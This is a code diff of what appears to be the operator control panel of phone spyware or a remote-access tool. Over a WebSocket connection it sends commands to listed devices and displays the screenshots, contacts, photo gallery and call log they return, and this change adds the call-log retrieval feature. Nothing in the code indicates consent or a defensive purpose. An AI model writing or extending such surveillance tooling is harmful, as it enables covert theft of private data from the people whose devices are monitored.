@@ -35,14 +35,16 @@
      </div>
    </div>
    <script>
-   var conn = new WebSocket('ws://43.228.237.131:8080');
-  //  var conn = new WebSocket('ws://localhost:8080');
+  // var conn = new WebSocket('ws://43.228.237.131:8080');
+    var conn = new WebSocket('ws://localhost:8080');
    	conn.onopen = function(e) {
    	    console.log("Connection established!");
    	};
 
     conn.onmessage = function(e) {
+      console.log(e.data);
   		var msg = JSON.parse(e.data);
+
       if(msg.type=="screenshot"){
         $("#image_display").html("<img src=\"data:image/png;base64,"+msg.image+"\">");
       }else if(msg.type=="contact"){
@@ -62,11 +64,13 @@
         var img = JSON.parse(msg.list);
 
         $("#image_display").html("<img class=\"devimg\" src=\"data:image/png;base64,"+img.img1+"\"><br><hr><img class=\"devimg\" src=\"data:image/png;base64,"+img.img2+"\"><br><hr><img class=\"devimg\" src=\"data:image/png;base64,"+img.img3+"\">");
+      }else if(msg.type=="calllog"){
+        $("#image_display").html("<pre>"+msg.list+"</pre>");
       }
   		console.log(msg);
   	};
+    
     //conn.send(JSON.stringify(msg));
-
     function screenshot(id){
       var msg={};
       msg.device=id;
@@ -96,6 +100,15 @@
         $("#image_display").html("<h1>Getting Gallery</h1>");
       conn.send(msg);
     }
+    function callLog(id){
+      var msg={};
+      msg.device=id;
+      msg.cmd="calllog";
+      msg=JSON.stringify(msg);
+      console.log("sending : "+msg);
+        $("#image_display").html("<h1>Getting Call Log</h1>");
+      conn.send(msg);
+    }
 
    $(document).ready(function(){
      $.getJSON("./db/get_devices.php",function(data){
@@ -120,6 +133,7 @@
             htmlString+="<button class=\"btn btn-primary\" onclick=\"screenshot("+value.id+")\" >Screenshot</button><br>";
             htmlString+="<button class=\"btn btn-primary\" onclick=\"contacts("+value.id+")\" >Request Contacts</button><br>";
             htmlString+="<button class=\"btn btn-primary\" onclick=\"gallery("+value.id+")\" >Request Gallery</button><br>";
+            htmlString+="<button class=\"btn btn-primary\" onclick=\"callLog("+value.id+")\" >Request Call Log</button><br>";
           }
           htmlString+="</td>";
          htmlString+="</tr>";
